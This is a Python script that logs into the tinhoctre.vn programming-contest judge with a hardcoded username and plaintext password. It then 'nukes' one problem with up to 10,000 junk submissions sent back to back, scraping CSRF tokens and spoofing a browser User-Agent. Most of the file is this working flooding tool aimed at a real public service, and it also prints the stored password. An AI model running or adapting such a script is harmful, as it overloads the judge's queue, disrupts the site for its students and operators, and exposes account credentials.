import requests
import time
import argparse
import json

from bs4 import BeautifulSoup

session = requests.Session()

# If username or password is not specified, these will be used instead
USERNAME = 'UltimateWiener' 
PASSWORD = 'T43r@6pqUJCKYLH' 

LOGIN_URL = 'https://tinhoctre.vn/accounts/login/' 
SUBMIT_URL = 'https://tinhoctre.vn/problem/digit/submit'

MAX_SUBMISSIONS = 10000
SUBMISSION_DELAY = 0.0 # seconds

username = USERNAME
password = PASSWORD

start_time = time.time()
successful_submissions = 0
failed_submissions = 0
logged_in = False
id = 1

def log_status():
    log_path = f'logs/log_{id}.json'
    log_data = {}
    
    log_data['successful_submissions'] = successful_submissions
    log_data['failed_submissions'] = failed_submissions
    log_data['elapsed_time'] = time.time() - start_time
    log_data['logged_in'] = logged_in
    log_data['max_submissions'] = MAX_SUBMISSIONS 
    log_data['username'] = username
    
    with open(log_path, 'w') as file:
        json.dump(log_data, file, indent=4)

def login():
    print(f"Attempting to login with [username = {username}], [password = {password}]")
    
    login_url = LOGIN_URL
    resp = session.get(login_url)

    soup = BeautifulSoup(resp.text, 'html.parser')
    csrf_token = soup.find('input', {'name': 'csrfmiddlewaretoken'})['value']

    login_form = {
        'username': username,
        'password': password,
        'csrfmiddlewaretoken': csrf_token,
        'next': ''
    }
    headers = {
        'Referer': LOGIN_URL,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
    }
    resp = session.post(login_url, data=login_form, headers=headers)
    if resp.url == LOGIN_URL:
        print("Login failed!")
    else:
        global logged_in
        logged_in = True
        print("Login successful!")

def submit():
    submit_url = SUBMIT_URL
    resp = session.get(submit_url)

    soup = BeautifulSoup(resp.text, 'html.parser')
    csrf_token = soup.find('input', {'name': 'csrfmiddlewaretoken'})['value']

    submit_form = {
        'source': 'lol',
        'submission_file': '(binary)',
        'csrfmiddlewaretoken': csrf_token,
        'language': '4',
        'judge': '',
    }
    headers = {
        'Referer': SUBMIT_URL,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    }
    resp = session.post(submit_url, data=submit_form, headers=headers)
    if resp.url == SUBMIT_URL:
        global failed_submissions
        failed_submissions += 1
        print("Submission failed!")
    else:
        global successful_submissions
        successful_submissions += 1
        print(resp.url)

def parse_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--username', type=str, help='Account username (If not specified, USERNAME will be used instead)')
    parser.add_argument('-p', '--password', type=str, help='Account password (If not specified, PASSWORD will be used instead)')
    parser.add_argument('-i', '--id', type=int, help='Indexing, useful for logs')
    args = parser.parse_args()

    return args

args = parse_arguments()
if args.username is not None:
    username = args.username
if args.password is not None:
    password = args.password
if args.id is not None:
    id = args.id

log_status()
login()
print("Begin nuking")

log_status()
for i in range(MAX_SUBMISSIONS):
    time.sleep(SUBMISSION_DELAY)
    submit()
    log_status()